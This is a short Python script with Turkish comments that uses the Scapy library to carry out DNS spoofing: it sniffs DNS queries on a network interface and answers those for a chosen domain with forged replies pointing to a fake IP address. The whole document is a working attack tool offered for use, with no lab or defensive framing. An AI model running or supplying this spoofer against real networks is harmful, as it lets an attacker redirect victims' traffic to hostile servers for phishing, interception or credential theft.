from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send, sniff
import sys

def dns_spoof(target_domain, fake_ip, interface='eth0'):
    """DNS spoofing yaparak hedef domain adını sahte IP adresine yönlendirir."""
    def packet_callback(packet):
        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
            query = packet.getlayer(DNS).qd.qname.decode()
            if target_domain in query:
                print(f"Sahte DNS yanıtı gönderiliyor: {target_domain} -> {fake_ip}")

                # DNS Yanıtı oluştur
                dns_response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                               UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                               DNS(id=packet[DNS].id, qr=1, qd=packet[DNS].qd, \
                                   an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=fake_ip), \
                                   ns=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=fake_ip))
                
                send(dns_response, iface=interface, verbose=False)

    print(f"DNS spoofing başlatılıyor: {target_domain} -> {fake_ip}")
    sniff(iface=interface, filter="udp port 53", prn=packet_callback, store=0)